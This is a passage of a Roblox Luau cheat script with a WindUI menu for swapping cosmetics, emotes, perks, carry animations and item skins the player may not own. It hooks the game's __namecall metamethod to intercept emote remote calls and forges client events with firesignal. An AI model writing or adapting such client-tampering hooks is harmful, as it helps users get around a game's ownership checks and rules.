                if not isSwapped then
                    WindUI:Notify({
                        Title = "Cosmetics Changer",
                        Content = "No cosmetics have been swapped yet",
                        Duration = 3
                    })
                    return
                end
                
                if originalCosmetic1 == "" or originalCosmetic2 == "" then
                    WindUI:Notify({
                        Title = "Cosmetics Changer",
                        Content = "Original cosmetic names not found",
                        Duration = 3
                    })
                    return
                end
                
                local ReplicatedStorage = game:GetService("ReplicatedStorage")    
                local Cosmetics = ReplicatedStorage:WaitForChild("Items"):WaitForChild("Cosmetics")    
                
                local function normalize(str)    
                    return str:gsub("%s+", ""):lower()    
                end    
                
                local function findSimilar(name)    
                    local bestMatch = name    
                    local bestScore = 0.5    
                    for _, c in ipairs(Cosmetics:GetChildren()) do    
                        local normalizedInput = normalize(name)
                        local normalizedCosmetic = normalize(c.Name)
                        if normalizedInput == normalizedCosmetic then
                            return c.Name
                        end
                    end    
                    return name
                end    
                
                local resetCosmetic1 = findSimilar(originalCosmetic1)
                local resetCosmetic2 = findSimilar(originalCosmetic2)
                
                local a = Cosmetics:FindFirstChild(cosmetic1)    
                local b = Cosmetics:FindFirstChild(cosmetic2)    
                
                -- Only reset if we can find both cosmetics
                if a and b then
                    local tempRoot = Instance.new("Folder", Cosmetics)    
                    tempRoot.Name = "__temp_reset_" .. tostring(tick()):gsub("%.", "_")    
                    
                    local tempA = Instance.new("Folder", tempRoot)    
                    local tempB = Instance.new("Folder", tempRoot)    
                    
                    for _, c in ipairs(a:GetChildren()) do c.Parent = tempA end    
                    for _, c in ipairs(b:GetChildren()) do c.Parent = tempB end    
                    
                    for _, c in ipairs(tempA:GetChildren()) do c.Parent = b end    
                    for _, c in ipairs(tempB:GetChildren()) do c.Parent = a end    
                    
                    tempRoot:Destroy()
                    
                    isSwapped = false
                    
                    WindUI:Notify({
                        Title = "Cosmetics Changer",
                        Content = "Successfully reset cosmetics to original state",
                        Duration = 3
                    })
                else
                    WindUI:Notify({
                        Title = "Cosmetics Changer",
                        Content = "Could not find swapped cosmetics to reset",
                        Duration = 3
                    })
                end
            end)
        end
    })  

player = game:GetService("Players").LocalPlayer
ReplicatedStorage = game:GetService("ReplicatedStorage")
Events = ReplicatedStorage:WaitForChild("Events", 10)
CharacterFolder = Events and Events:WaitForChild("Character", 10)
EmoteRemote = CharacterFolder and CharacterFolder:WaitForChild("Emote", 10)
PassCharacterInfo = CharacterFolder and CharacterFolder:WaitForChild("PassCharacterInfo", 10)

remoteSignal = PassCharacterInfo and PassCharacterInfo.OnClientEvent
currentTag = nil
currentEmotes = table.create(12, "")
selectEmotes = table.create(12, "")
emoteEnabled = table.create(12, false)

currentEmoteInputs = {}
selectEmoteInputs = {}

function readTagFromFolder(f)
    if not f then return nil end
    a = f:GetAttribute("Tag")
    if a ~= nil then 
        return a 
    end
    o = f:FindFirstChild("Tag")
    if o and o:IsA("ValueBase") then 
        return o.Value 
    end
    return nil
end

function onRespawn()
    currentTag = nil
    pendingSlot = nil
    
    task.spawn(function()
        startTime = tick()
        
        while tick() - startTime < 10 do
            if workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players") then
                pf = workspace.Game.Players:FindFirstChild(player.Name)
                if pf then
                    currentTag = readTagFromFolder(pf)
                    if currentTag then
                        b = tonumber(currentTag)
                        if b and b >= 0 and b <= 255 then
                            break
                        else
                            currentTag = nil
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

pendingSlot = nil
blockOriginalEmote = false
EmoteChangerSection = Tabs.Visuals:Section({ Title = "Emote Changer", TextSize = 20 })
EmoteChangerDivider = Tabs.Visuals:Divider()

for i = 1, 12 do
   currentEmoteInputs[i] = Tabs.Visuals:Input({
        Title = "Current Emote " .. i,
        Flag = "EmoteChangerSection",
        Placeholder = "Enter current emote name",
        Value = currentEmotes[i],
        Callback = function(v) 
            currentEmotes[i] = v:gsub("%s+", "")
        end
    })
end

Tabs.Visuals:Divider()

for i = 1, 12 do
   selectEmoteInputs[i] = Tabs.Visuals:Input({
        Title = "Select Emote " .. i,
        Placeholder = "Enter select emote name",
        Value = selectEmotes[i],
        Callback = function(v) 
            selectEmotes[i] = v:gsub("%s+", "")
        end
    })
end
VisualsEmoteOption = Tabs.Visuals:Input({
    Title = "Emote Possible option",
    Flag = "VisualsEmoteOption",
    Desc = "Higher Value may Broke emote animation recommend Use 1-3 (0 or 'Random' for random)",
    Placeholder = "0",
    Callback = function(v)
        Players = game:GetService("Players")
        player = Players.LocalPlayer
        
        local currentNum
        if v:lower() == "random" or tonumber(v) == 0 then
            currentNum = "Random"
        else
            currentNum = tonumber(v) or 1
        end
        
        function setupCharacter(character)
            if character == player.Character then
                if currentNum == "Random" then
                    character:SetAttribute("EmoteNum", math.random(1, 3))
                else
                    character:SetAttribute("EmoteNum", currentNum)
                end
            end
        end
        
        function monitorCharacter()
            while true do
                wait(1)
                character = player.Character
                if character and character:GetAttribute("EmoteNum") ~= currentNum then
                    if currentNum == "Random" then
                        character:SetAttribute("EmoteNum", math.random(1, 3))
                    else
                        character:SetAttribute("EmoteNum", currentNum)
                    end
                end
            end
        end
        
        if player.Character then
            setupCharacter(player.Character)
        end
        
        player.CharacterAdded:Connect(function(character)
            wait(1)
            setupCharacter(character)
        end)
        
        spawn(monitorCharacter)
    end
})
VisualsEmoteApply = Tabs.Visuals:Button({
    Title="Apply Emote Mappings",
    Icon="refresh-cw",
    Callback=function()
        hasAnyEmote = false
        
        for i=1,12 do
            if currentEmotes[i] ~= "" or selectEmotes[i] ~= "" then
                hasAnyEmote = true
                break
            end
        end
        
        if not hasAnyEmote then
            WindUI:Notify({
                Title="Emote Changer",
                Content="Please enter your emote",
                Duration=3
            })
            return
        end
        
        function normalizeEmoteName(name)
            return name:gsub("%s+", ""):lower()
        end
        
        function isValidEmote(emoteName)
            if emoteName == "" then return false, "" end
            
            normalizedInput = normalizeEmoteName(emoteName)
            emotesFolder = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
            if emotesFolder then
                emotesFolder = emotesFolder:FindFirstChild("Emotes")
                if emotesFolder then
                    for _, emoteModule in ipairs(emotesFolder:GetChildren()) do
                        if emoteModule:IsA("ModuleScript") then
                            normalizedEmote = normalizeEmoteName(emoteModule.Name)
                            if normalizedEmote == normalizedInput then
                                return true, emoteModule.Name
                            end
                        end
                    end
                end
            end
            return false, ""
        end
        
        sameEmoteSlots = {}
        missingEmoteSlots = {}
        invalidEmoteSlots = {}
        successfulSlots = {}
        
        for i=1,12 do
            if currentEmotes[i] ~= "" and selectEmotes[i] ~= "" then
                currentValid, currentActual = isValidEmote(currentEmotes[i])
                selectValid, selectActual = isValidEmote(selectEmotes[i])
                
                if not currentValid and not selectValid then
                    table.insert(invalidEmoteSlots, {slot = i, currentInvalid = true, currentName = currentEmotes[i], selectInvalid = true, selectName = selectEmotes[i]})
                elseif not currentValid then
                    table.insert(invalidEmoteSlots, {slot = i, currentInvalid = true, currentName = currentEmotes[i], selectInvalid = false, selectName = selectEmotes[i]})
                elseif not selectValid then
                    table.insert(invalidEmoteSlots, {slot = i, currentInvalid = false, currentName = currentEmotes[i], selectInvalid = true, selectName = selectEmotes[i]})
                elseif currentActual:lower() == selectActual:lower() then
                    table.insert(sameEmoteSlots, i)
                else
                    table.insert(successfulSlots, {slot = i, current = currentActual, select = selectActual})
                end
            elseif currentEmotes[i] ~= "" or selectEmotes[i] ~= "" then
                table.insert(missingEmoteSlots, i)
            end
        end
        
        message = ""
        
        if #successfulSlots > 0 then
            message = message .. "<font color='#00FF00'><stroke color='#000000' width='0.0001'>‚úì Successfully applied emote on:</stroke></font>\n"
            for _, data in ipairs(successfulSlots) do
                message = message .. "<font color='#00FF00'><stroke color='#000000' width='0.0001'>Slot " .. data.slot .. " Emote: " .. data.current .. " ‚Üí " .. data.select .. "</stroke></font>\n"
            end
            message = message .. "\n"
        end
        
        if #sameEmoteSlots > 0 then
            message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>üÜá Failed to apply emote on:</stroke></font>\n"
            for _, slot in ipairs(sameEmoteSlots) do
                message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>Slot " .. slot .. " - Cannot change emote with the same name</stroke></font>\n"
            end
            message = message .. "\n"
        end
        
        if #invalidEmoteSlots > 0 then
            message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>üÜá Failed to apply emote on:</stroke></font>\n"
            for _, data in ipairs(invalidEmoteSlots) do
                message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>Slot " .. data.slot .. " - "
                if data.currentInvalid and data.selectInvalid then
                    message = message .. "Invalid current emote: \"" .. data.currentName .. "\", Invalid select emote: \"" .. data.selectName .. "\"</stroke></font>\n"
                elseif data.currentInvalid then
                    message = message .. "Invalid current emote: \"" .. data.currentName .. "\", Select emote: \"" .. data.selectName .. "\"</stroke></font>\n"
                else
                    message = message .. "Current emote: \"" .. data.currentName .. "\", Invalid select emote: \"" .. data.selectName .. "\"</stroke></font>\n"
                end
            end
            message = message .. "\n"
        end
        
        if #missingEmoteSlots > 0 then
            message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>üÜá Failed to apply emote on:</stroke></font>\n"
            for _, slot in ipairs(missingEmoteSlots) do
                if currentEmotes[slot] == "" then
                    message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>Slot " .. slot .. " - Current emote slot is missing text</stroke></font>\n"
                else
                    message = message .. "<font color='##ff0000'><stroke color='#FFFFFF' width='0.0001'>Slot " .. slot .. " - Select emote slot is missing text</stroke></font>\n"
                end
            end
        end
        
        for i=1,12 do
            currentValid = isValidEmote(currentEmotes[i])
            selectValid = isValidEmote(selectEmotes[i])
            emoteEnabled[i] = (currentValid and selectValid and currentEmotes[i]:lower() ~= selectEmotes[i]:lower())
        end
        
        WindUI:Notify({
            Title="Emote Changer",
            Content=message,
            Duration=8
        })
    end
})

VisualsEmoteReset = Tabs.Visuals:Button({
    Title = "Reset All Emotes",
    Icon = "trash-2",
    Callback = function()
        for i = 1, 12 do
            currentEmotes[i] = ""
            selectEmotes[i] = ""
            emoteEnabled[i] = false
            
            if currentEmoteInputs[i] and currentEmoteInputs[i].Set then
                currentEmoteInputs[i]:Set("")
            end
            if selectEmoteInputs[i] and selectEmoteInputs[i].Set then
                selectEmoteInputs[i]:Set("")
            end
        end
        
        if VisualsEmoteOption and VisualsEmoteOption.Set then
            VisualsEmoteOption:Set("")
        end
        
        WindUI:Notify({
            Title = "Emote Changer", 
            Content = "All emotes have been reset!"
        })
    end
})

function fireSelect(slot)
    if not currentTag then return end
    
    b = tonumber(currentTag)
    if not b or b < 0 or b > 255 then return end
    if not selectEmotes[slot] or selectEmotes[slot] == "" then return end
    
    buf = buffer.create(2)
    buffer.writeu8(buf, 0, b)
    buffer.writeu8(buf, 1, 17)
    
    if remoteSignal then
        firesignal(remoteSignal, buf, {selectEmotes[slot]})
    end
end

if PassCharacterInfo and EmoteRemote then
    PassCharacterInfo.OnClientEvent:Connect(function(...)
        if not pendingSlot then return end
        slot = pendingSlot
        pendingSlot = nil
        task.wait(0.1)
        fireSelect(slot)
    end)

    -- error handel code
success, oldNamecall = pcall(function()
    return hookmetamethod(game, "__namecall", function(self, ...)
        local m
        local ok, err = pcall(function()
            m = getnamecallmethod()
        end)
        if not ok then return nil end

        a = {...}
        if m == "FireServer" and self == EmoteRemote and type(a[1]) == "string" then
            for i = 1, 12 do
                if emoteEnabled[i] and currentEmotes[i] ~= "" and a[1] == currentEmotes[i] then
                    pendingSlot = i
                    blockOriginalEmote = true
                    task.spawn(function()
                        local ok2, err2 = pcall(function()
                            task.wait(0.1)
                            blockOriginalEmote = false
                            if pendingSlot == i then
                                pendingSlot = nil
                                fireSelect(i)
                            end
                        end)
                        if not ok2 then warn(err2) end
                    end)
                    if blockOriginalEmote then
                        return nil
                    end
                end
            end
        end
        return oldNamecall(self, ...)
    end)
end)

if not success then
  warn("Error hooking __namecall:", oldNamecall)
          for i = 1, 12 do
            if currentEmoteInputs[i] then
                if typeof(currentEmoteInputs[i]) == "table" and currentEmoteInputs[i].Destroy then
                    pcall(function()
                        currentEmoteInputs[i]:Destroy()
                    end)
                end
                currentEmoteInputs[i] = nil
            end
            
            if selectEmoteInputs[i] then
                if typeof(selectEmoteInputs[i]) == "table" and selectEmoteInputs[i].Destroy then
                    pcall(function()
                        selectEmoteInputs[i]:Destroy()
                    end)
                end
                selectEmoteInputs[i] = nil
            end
            
            currentEmotes[i] = ""
            selectEmotes[i] = ""
            emoteEnabled[i] = false
        end
        
        if VisualsEmoteApply and typeof(VisualsEmoteApply) == "table" and VisualsEmoteApply.Destroy then
            pcall(function()
                VisualsEmoteApply:Destroy()
            end)
            VisualsEmoteApply = nil
        end
        
        if VisualsEmoteReset and typeof(VisualsEmoteReset) == "table" and VisualsEmoteReset.Destroy then
            pcall(function()
                VisualsEmoteReset:Destroy()
            end)
            VisualsEmoteReset = nil
        end
    end
    if player.Character then
        task.spawn(onRespawn)
    end
    
    player.CharacterAdded:Connect(function()
        task.wait(1)
        onRespawn()
    end)
    
    if workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players") then
        workspace.Game.Players.ChildAdded:Connect(function(child)
            if child.Name == player.Name then
                task.wait(0.5)
                onRespawn()
            end
        end)
        
        workspace.Game.Players.ChildRemoved:Connect(function(child)
            if child.Name == player.Name then
                currentTag = nil
                pendingSlot = nil
            end
        end)
    end
end
currentCarryAnim = ""
selectedCarryAnim = ""
lastCurrentCarryAnim = ""
lastSelectedCarryAnim = ""
isSwapped = false

currentPerk = ""
selectedPerk = ""
lastCurrentPerk = ""
lastSelectedPerk = ""
isPerkSwapped = false

currentPerk2 = ""
selectedPerk2 = ""
lastCurrentPerk2 = ""
lastSelectedPerk2 = ""
isPerkSwapped2 = false

currentTool = ""
currentSkin = ""
selectedSkin = ""
lastCurrentTool = ""
lastCurrentSkin = ""
lastSelectedSkin = ""
isSkinSwapped = false

function normalizeString(str)
    return str:gsub("%s+", ""):lower()
end

function isValidCarryAnimation(name)
    carryAnimations = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not carryAnimations then return false end
    carryAnimations = carryAnimations:FindFirstChild("CarryAnimations")
    if not carryAnimations then return false end
    
    normalizedInput = normalizeString(name)
    for _, anim in ipairs(carryAnimations:GetChildren()) do
        if normalizeString(anim.Name) == normalizedInput then
            return true, anim.Name
        end
    end
    return false
end

function revertPreviousSwap()
    if lastCurrentCarryAnim ~= "" and lastSelectedCarryAnim ~= "" and isSwapped then
        carryAnimations = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
        if carryAnimations then
            carryAnimations = carryAnimations:FindFirstChild("CarryAnimations")
            if carryAnimations then
                lastCurrentValid, lastCurrentActual = isValidCarryAnimation(lastCurrentCarryAnim)
                lastSelectedValid, lastSelectedActual = isValidCarryAnimation(lastSelectedCarryAnim)
                
                if lastCurrentValid and lastSelectedValid then
                    pcall(function()
                        currentFolder = carryAnimations:FindFirstChild(lastCurrentActual)
                        selectedFolder = carryAnimations:FindFirstChild(lastSelectedActual)
                        
                        if currentFolder and selectedFolder then
                            tempRoot = Instance.new("Folder")
                            tempRoot.Name = "__temp_revert_swap_" .. tostring(tick()):gsub("%.", "_")
                            tempRoot.Parent = carryAnimations
                            
                            tempCurrent = Instance.new("Folder")
                            tempCurrent.Name = "tempCurrent"
                            tempCurrent.Parent = tempRoot
                            
                            tempSelected = Instance.new("Folder")
                            tempSelected.Name = "tempSelected"
                            tempSelected.Parent = tempRoot
                            
                            for _, child in ipairs(currentFolder:GetChildren()) do
                                child.Parent = tempCurrent
                            end
                            
                            for _, child in ipairs(selectedFolder:GetChildren()) do
                                child.Parent = tempSelected
                            end
                            
                            for _, child in ipairs(tempCurrent:GetChildren()) do
                                child.Parent = selectedFolder
                            end
                            
                            for _, child in ipairs(tempSelected:GetChildren()) do
                                child.Parent = currentFolder
                            end
                            
                            tempRoot:Destroy()
                        end
                    end)
                end
            end
        end
        isSwapped = false
    end
end

function swapCarryAnimations(current, selected)
    revertPreviousSwap()
    
    currentNorm = normalizeString(current)
    selectedNorm = normalizeString(selected)
    
    if currentNorm == "" or selectedNorm == "" then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "Both animation names must be filled",
            Duration = 3
        })
        return
    end
    
    if currentNorm == selectedNorm then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "Animation names cannot be the same",
            Duration = 3
        })
        return
    end
    
    carryAnimations = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not carryAnimations then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "CarryAnimations folder not found",
            Duration = 3
        })
        return
    end
    
    carryAnimations = carryAnimations:FindFirstChild("CarryAnimations")
    if not carryAnimations then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "CarryAnimations folder not found",
            Duration = 3
        })
        return
    end
    
    currentAnim, currentActualName = isValidCarryAnimation(current)
    selectedAnim, selectedActualName = isValidCarryAnimation(selected)
    
    if not currentAnim then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "Current animation not found: " .. current,
            Duration = 3
        })
        return
    end
    
    if not selectedAnim then
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "Selected animation not found: " .. selected,
            Duration = 3
        })
        return
    end
    
    pcall(function()
        currentFolder = carryAnimations:FindFirstChild(currentActualName)
        selectedFolder = carryAnimations:FindFirstChild(selectedActualName)
        
        if not currentFolder or not selectedFolder then
            WindUI:Notify({
                Title = "CarryAnimation Replacer",
                Content = "One or both animations not found in folder",
                Duration = 3
            })
            return
        end
        
        tempRoot = Instance.new("Folder")
        tempRoot.Name = "__temp_carry_swap_" .. tostring(tick()):gsub("%.", "_")
        tempRoot.Parent = carryAnimations
        
        tempCurrent = Instance.new("Folder")
        tempCurrent.Name = "tempCurrent"
        tempCurrent.Parent = tempRoot
        
        tempSelected = Instance.new("Folder")
        tempSelected.Name = "tempSelected"
        tempSelected.Parent = tempRoot
        
        for _, child in ipairs(currentFolder:GetChildren()) do
            child.Parent = tempCurrent
        end
        
        for _, child in ipairs(selectedFolder:GetChildren()) do
            child.Parent = tempSelected
        end
        
        for _, child in ipairs(tempCurrent:GetChildren()) do
            child.Parent = selectedFolder
        end
        
        for _, child in ipairs(tempSelected:GetChildren()) do
            child.Parent = currentFolder
        end
        
        tempRoot:Destroy()
        
        lastCurrentCarryAnim = current
        lastSelectedCarryAnim = selected
        isSwapped = true
        
        WindUI:Notify({
            Title = "CarryAnimation Replacer",
            Content = "Successfully swapped " .. currentActualName .. " with " .. selectedActualName,
            Duration = 3
        })
    end)
end

function isValidPerk(name)
    perks = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not perks then return false end
    perks = perks:FindFirstChild("Perks")
    if not perks then return false end
    
    normalizedInput = normalizeString(name)
    for _, perk in ipairs(perks:GetChildren()) do
        if normalizeString(perk.Name) == normalizedInput then
            return true, perk.Name
        end
    end
    return false
end

function revertPreviousPerkSwap()
    if lastCurrentPerk ~= "" and lastSelectedPerk ~= "" and isPerkSwapped then
        perks = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
        if perks then
            perks = perks:FindFirstChild("Perks")
            if perks then
                lastCurrentValid, lastCurrentActual = isValidPerk(lastCurrentPerk)
                lastSelectedValid, lastSelectedActual = isValidPerk(lastSelectedPerk)
                
                if lastCurrentValid and lastSelectedValid then
                    pcall(function()
                        currentFolder = perks:FindFirstChild(lastCurrentActual)
                        selectedFolder = perks:FindFirstChild(lastSelectedActual)
                        
                        if currentFolder and selectedFolder then
                            tempRoot = Instance.new("Folder")
                            tempRoot.Name = "__temp_perk_revert_" .. tostring(tick()):gsub("%.", "_")
                            tempRoot.Parent = perks
                            
                            tempCurrent = Instance.new("Folder")
                            tempCurrent.Name = "tempCurrent"
                            tempCurrent.Parent = tempRoot
                            
                            tempSelected = Instance.new("Folder")
                            tempSelected.Name = "tempSelected"
                            tempSelected.Parent = tempRoot
                            
                            for _, child in ipairs(currentFolder:GetChildren()) do
                                child.Parent = tempCurrent
                            end
                            
                            for _, child in ipairs(selectedFolder:GetChildren()) do
                                child.Parent = tempSelected
                            end
                            
                            for _, child in ipairs(tempCurrent:GetChildren()) do
                                child.Parent = selectedFolder
                            end
                            
                            for _, child in ipairs(tempSelected:GetChildren()) do
                                child.Parent = currentFolder
                            end
                            
                            tempRoot:Destroy()
                        end
                    end)
                end
            end
        end
        isPerkSwapped = false
    end
end

function swapPerks(current, selected)
    revertPreviousPerkSwap()
    
    currentNorm = normalizeString(current)
    selectedNorm = normalizeString(selected)
    
    if currentNorm == "" or selectedNorm == "" then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Both perk names must be filled",
            Duration = 3
        })
        return
    end
    
    if currentNorm == selectedNorm then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Perk names cannot be the same",
            Duration = 3
        })
        return
    end
    
    perks = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not perks then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Perks folder not found",
            Duration = 3
        })
        return
    end
    
    perks = perks:FindFirstChild("Perks")
    if not perks then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Perks folder not found",
            Duration = 3
        })
        return
    end
    
    currentPerkValid, currentActualName = isValidPerk(current)
    selectedPerkValid, selectedActualName = isValidPerk(selected)
    
    if not currentPerkValid then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Current perk not found: " .. current,
            Duration = 3
        })
        return
    end
    
    if not selectedPerkValid then
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Selected perk not found: " .. selected,
            Duration = 3
        })
        return
    end
    
    pcall(function()
        currentFolder = perks:FindFirstChild(currentActualName)
        selectedFolder = perks:FindFirstChild(selectedActualName)
        
        if not currentFolder or not selectedFolder then
            WindUI:Notify({
                Title = "Perk Replacer",
                Content = "One or both perks not found in folder",
                Duration = 3
            })
            return
        end
        
        tempRoot = Instance.new("Folder")
        tempRoot.Name = "__temp_perk_swap_" .. tostring(tick()):gsub("%.", "_")
        tempRoot.Parent = perks
        
        tempCurrent = Instance.new("Folder")
        tempCurrent.Name = "tempCurrent"
        tempCurrent.Parent = tempRoot
        
        tempSelected = Instance.new("Folder")
        tempSelected.Name = "tempSelected"
        tempSelected.Parent = tempRoot
        
        for _, child in ipairs(currentFolder:GetChildren()) do
            child.Parent = tempCurrent
        end
        
        for _, child in ipairs(selectedFolder:GetChildren()) do
            child.Parent = tempSelected
        end
        
        for _, child in ipairs(tempCurrent:GetChildren()) do
            child.Parent = selectedFolder
        end
        
        for _, child in ipairs(tempSelected:GetChildren()) do
            child.Parent = currentFolder
        end
        
        tempRoot:Destroy()
        
        lastCurrentPerk = current
        lastSelectedPerk = selected
        isPerkSwapped = true
        
        WindUI:Notify({
            Title = "Perk Replacer",
            Content = "Successfully swapped " .. currentActualName .. " with " .. selectedActualName,
            Duration = 3
        })
    end)
end

function revertPreviousPerkSwap2()
    if lastCurrentPerk2 ~= "" and lastSelectedPerk2 ~= "" and isPerkSwapped2 then
        perks = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
        if perks then
            perks = perks:FindFirstChild("Perks")
            if perks then
                lastCurrentValid, lastCurrentActual = isValidPerk(lastCurrentPerk2)
                lastSelectedValid, lastSelectedActual = isValidPerk(lastSelectedPerk2)
                
                if lastCurrentValid and lastSelectedValid then
                    pcall(function()
                        currentFolder = perks:FindFirstChild(lastCurrentActual)
                        selectedFolder = perks:FindFirstChild(lastSelectedActual)
                        
                        if currentFolder and selectedFolder then
                            tempRoot = Instance.new("Folder")
                            tempRoot.Name = "__temp_perk_revert2_" .. tostring(tick()):gsub("%.", "_")
                            tempRoot.Parent = perks
                            
                            tempCurrent = Instance.new("Folder")
                            tempCurrent.Name = "tempCurrent"
                            tempCurrent.Parent = tempRoot
                            
                            tempSelected = Instance.new("Folder")
                            tempSelected.Name = "tempSelected"
                            tempSelected.Parent = tempRoot
                            
                            for _, child in ipairs(currentFolder:GetChildren()) do
                                child.Parent = tempCurrent
                            end
                            
                            for _, child in ipairs(selectedFolder:GetChildren()) do
                                child.Parent = tempSelected
                            end
                            
                            for _, child in ipairs(tempCurrent:GetChildren()) do
                                child.Parent = selectedFolder
                            end
                            
                            for _, child in ipairs(tempSelected:GetChildren()) do
                                child.Parent = currentFolder
                            end
                            
                            tempRoot:Destroy()
                        end
                    end)
                end
            end
        end
        isPerkSwapped2 = false
    end
end

function swapPerks2(current, selected)
    revertPreviousPerkSwap2()
    
    currentNorm = normalizeString(current)
    selectedNorm = normalizeString(selected)
    
    if currentNorm == "" or selectedNorm == "" then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Both perk names must be filled",
            Duration = 3
        })
        return
    end
    
    if currentNorm == selectedNorm then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Perk names cannot be the same",
            Duration = 3
        })
        return
    end
    
    perks = game:GetService("ReplicatedStorage"):FindFirstChild("Items")
    if not perks then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Perks folder not found",
            Duration = 3
        })
        return
    end
    
    perks = perks:FindFirstChild("Perks")
    if not perks then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Perks folder not found",
            Duration = 3
        })
        return
    end
    
    currentPerkValid, currentActualName = isValidPerk(current)
    selectedPerkValid, selectedActualName = isValidPerk(selected)
    
    if not currentPerkValid then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Current perk not found: " .. current,
            Duration = 3
        })
        return
    end
    
    if not selectedPerkValid then
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Selected perk not found: " .. selected,
            Duration = 3
        })
        return
    end
    
    pcall(function()
        currentFolder = perks:FindFirstChild(currentActualName)
        selectedFolder = perks:FindFirstChild(selectedActualName)
        
        if not currentFolder or not selectedFolder then
            WindUI:Notify({
                Title = "Perk Replacer 2",
                Content = "One or both perks not found in folder",
                Duration = 3
            })
            return
        end
        
        tempRoot = Instance.new("Folder")
        tempRoot.Name = "__temp_perk_swap2_" .. tostring(tick()):gsub("%.", "_")
        tempRoot.Parent = perks
        
        tempCurrent = Instance.new("Folder")
        tempCurrent.Name = "tempCurrent"
        tempCurrent.Parent = tempRoot
        
        tempSelected = Instance.new("Folder")
        tempSelected.Name = "tempSelected"
        tempSelected.Parent = tempRoot
        
        for _, child in ipairs(currentFolder:GetChildren()) do
            child.Parent = tempCurrent
        end
        
        for _, child in ipairs(selectedFolder:GetChildren()) do
            child.Parent = tempSelected
        end
        
        for _, child in ipairs(tempCurrent:GetChildren()) do
            child.Parent = selectedFolder
        end
        
        for _, child in ipairs(tempSelected:GetChildren()) do
            child.Parent = currentFolder
        end
        
        tempRoot:Destroy()
        
        lastCurrentPerk2 = current
        lastSelectedPerk2 = selected
        isPerkSwapped2 = true
        
        WindUI:Notify({
            Title = "Perk Replacer 2",
            Content = "Successfully swapped " .. currentActualName .. " with " .. selectedActualName,
            Duration = 3
        })
    end)
end

function isValidTool(toolName)
    tools = game:GetService("ReplicatedStorage"):FindFirstChild("Tools")
    if not tools then return false end
    tool = tools:FindFirstChild(toolName)
    if not tool then return false end
    variants = tool:FindFirstChild("Variants")
    if not variants then return false end
    return true, tool, variants
end

function isValidSkin(toolName, skinName)
    toolValid, tool, variants = isValidTool(toolName)
    if not toolValid then return false end
    skin = variants:FindFirstChild(skinName)
    if not skin then return false end
    return true, tool, variants, skin
end

function revertPreviousSkinSwap()
    if lastCurrentTool ~= "" and lastCurrentSkin ~= "" and lastSelectedSkin ~= "" and isSkinSwapped then
        currentValid, currentTool, currentVariants, currentSkin = isValidSkin(lastCurrentTool, lastCurrentSkin)
        selectedValid, selectedTool, selectedVariants, selectedSkin = isValidSkin(lastCurrentTool, lastSelectedSkin)
        
        if currentValid and selectedValid then
            pcall(function()
                tempRoot = Instance.new("Folder")
                tempRoot.Name = "__temp_skin_revert_" .. tostring(tick()):gsub("%.", "_")
                tempRoot.Parent = currentVariants
                
                tempCurrent = Instance.new("Folder")
                tempCurrent.Name = "tempCurrent"
                tempCurrent.Parent = tempRoot
                
                tempSelected = Instance.new("Folder")
                tempSelected.Name = "tempSelected"
                tempSelected.Parent = tempRoot
                
                for _, child in ipairs(currentSkin:GetChildren()) do
                    child.Parent = tempCurrent
                end
                
                for _, child in ipairs(selectedSkin:GetChildren()) do
                    child.Parent = tempSelected
                end
                
                for _, child in ipairs(tempCurrent:GetChildren()) do
                    child.Parent = selectedSkin
                end
                
                for _, child in ipairs(tempSelected:GetChildren()) do
                    child.Parent = currentSkin
                end
                
                tempRoot:Destroy()
            end)
        end
        isSkinSwapped = false
    end
end

function swapSkins(toolName, currentSkinName, selectedSkinName)
    if currentTool ~= "" and currentTool ~= toolName then
        revertPreviousSkinSwap()
    end
    
    currentNorm = normalizeString(currentSkinName)
    selectedNorm = normalizeString(selectedSkinName)
    
    if toolName == "" or currentNorm == "" or selectedNorm == "" then
        WindUI:Notify({
            Title = "Item Skin Changer",
            Content = "All fields must be filled",
            Duration = 3
        })
        return
    end
    
    if currentNorm == selectedNorm then
        WindUI:Notify({
            Title = "Item Skin Changer",
            Content = "Skin names cannot be the same",
            Duration = 3
        })
        return
    end
    
    currentValid, currentTool, currentVariants, currentSkin = isValidSkin(toolName, currentSkinName)
    selectedValid, selectedTool, selectedVariants, selectedSkin = isValidSkin(toolName, selectedSkinName)
    
    if not currentValid then
        WindUI:Notify({
            Title = "Item Skin Changer",
            Content = "Current skin not found: " .. currentSkinName,
            Duration = 3
        })
        return
    end
    
    if not selectedValid then
        WindUI:Notify({
            Title = "Item Skin Changer",
